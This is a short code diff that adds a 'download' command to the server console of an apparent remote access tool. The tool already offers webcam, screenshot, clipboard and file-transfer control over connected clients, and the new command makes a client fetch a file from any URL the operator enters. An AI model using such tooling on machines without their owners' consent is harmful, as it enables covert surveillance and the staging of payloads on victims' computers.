@@ -14,6 +14,7 @@ from modules import screenshot
 from modules import webcam
 from modules import clipboard
 from modules import filetransfer
+from modules import download
 
 from utils.prompts import increase_timeout_prompt
 
@@ -51,6 +52,7 @@ copy
 paste
 receive
 send
+download
 exit/back
 """
 
@@ -155,6 +157,8 @@ class ServerCLI(BaseServer):
                 self.receive_cli(client)
             case 'send':
                 self.send_cli(client)
+            case 'download':
+                self.download_cli(client)
             case _:
                 print('Command was not recognized, type "help" for help.')
 
@@ -284,6 +288,17 @@ class ServerCLI(BaseServer):
             print(str(error))
         else:
             print('File transferred successfully')
+
+    def download_cli(self, client: Client) -> None:
+        """ Make the client download a file from the web """
+        url = input('File URL: ')
+        save_name = input('Save file as: ')
+        try:
+            download.download(client, url, save_name)
+        except RuntimeError as error:
+            print(str(error))
+        else:
+            print("Successfully downloaded file.")
 
 
 if __name__ == '__main__':
